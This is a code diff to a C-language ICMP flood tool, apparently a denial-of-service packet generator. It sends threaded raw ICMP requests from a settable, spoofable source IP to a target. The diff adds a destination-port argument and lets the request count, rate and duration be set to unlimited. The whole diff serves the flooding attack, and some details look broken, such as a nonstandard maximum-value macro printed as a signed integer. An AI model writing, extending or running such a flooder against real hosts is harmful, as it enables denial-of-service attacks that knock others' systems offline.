@@ -3,14 +3,15 @@
 #include "icmp_flood.h"
 #include "make_ipv4.h"
 
-int icmp_total;
-int icmp_produced;
+unsigned int icmp_total;
+unsigned int icmp_produced;
 
-int icmp_per_second;
-int icmp_duration;
+unsigned int icmp_per_second;
+unsigned int icmp_duration;
 double icmp_elapsed_time;
 char *icmp_dest_ip;
 char *icmp_src_ip;
+int icmp_dest_port;
 
 pthread_mutex_t icmp_mutex;
 pthread_cond_t icmp_cond;
@@ -18,10 +19,10 @@ pthread_cond_t icmp_cond;
 void icmp_flood_print_usage(int mode) {
 	if (mode == 1)
 		printf(
-				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
+				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] \n");
 	if (mode == 2)
 		printf(
-				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds] [icmp_duration (0 for INF)]\n");
+				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [icmp_duration (0 for INF)] [Dest-Port]\n");
 }
 
 void* generate_icmp_request1(void *data) {
@@ -40,7 +41,7 @@ void* generate_icmp_request1(void *data) {
 		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));
 
 		//modify icmp_src_ip, increment 1.
-		next_ip_addr(icmp_src_ip, 1);
+		//next_ip_addr(icmp_src_ip, 1);
 
 		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));
 
@@ -64,7 +65,7 @@ void* generate_icmp_request1(void *data) {
 			return 0;
 		}
 
-		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
+		send_packet(sock, ipv4_h, packet,icmp_dest_port);
 		free(packet);
 		icmp_produced++;
 
@@ -90,7 +91,7 @@ void* generate_icmp_request2(void *data) {
 		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));
 
 		//modify icmp_src_ip, increment 1.
-		next_ip_addr(icmp_src_ip, 1);
+		//next_ip_addr(icmp_src_ip, 1);
 
 		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));
 
@@ -116,7 +117,7 @@ void* generate_icmp_request2(void *data) {
 		if (icmp_produced == icmp_per_second) {
 			pthread_cond_wait(&icmp_cond, &icmp_mutex);
 		}
-		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
+		send_packet(sock, ipv4_h, packet, icmp_dest_port);
 		free(packet);
 		icmp_produced++;
 		icmp_total++;
@@ -161,10 +162,10 @@ void icmp_flood_run(char *argv[], int mode) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 4) {
+	if (mode == 1 && argc != 5) {
 		icmp_flood_print_usage(mode);
 		return;
-	} else if (mode == 2 && argc != 5) {
+	} else if (mode == 2 && argc != 6) {
 		icmp_flood_print_usage(mode);
 		return;
 	}
@@ -175,19 +176,34 @@ void icmp_flood_run(char *argv[], int mode) {
 
 	icmp_produced = 0;
 	if (mode == 1)
+	{
 		icmp_total = atoi(argv[3]);
+		icmp_dest_port = atoi(argv[4]);
+		if(icmp_total==0)
+			icmp_total = __UINT_MAXIMUM__;
+	}
+
 
 	if (mode == 2) {
 		icmp_total = 0;
 		icmp_per_second = atoi(argv[3]);
 		icmp_duration = atoi(argv[4]);
+
+		if(icmp_per_second == 0)
+			icmp_per_second = __UINT_MAXIMUM__;
+
 		if (icmp_duration == 0)
-			icmp_duration = (1 << 30);
+			icmp_duration = __UINT_MAXIMUM__;
+
+		icmp_dest_port = atoi(argv[5]);
 	}
+
+	printf("Maximum = %d\n",__UINT_MAXIMUM__);
 
 	int num_threads = atoi(argv[2]);
 
 	icmp_dest_ip = argv[1];
+
 
 	int *generate_thread_id;
 	pthread_t *generate_thread;
@@ -195,6 +211,7 @@ void icmp_flood_run(char *argv[], int mode) {
 	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
 	generate_thread = (pthread_t*) malloc(
 			sizeof(pthread_t) * (num_threads + 1));
+
 	int i;
 
 	printf("Sending ICMP requests to %s using %d threads\n", icmp_dest_ip,
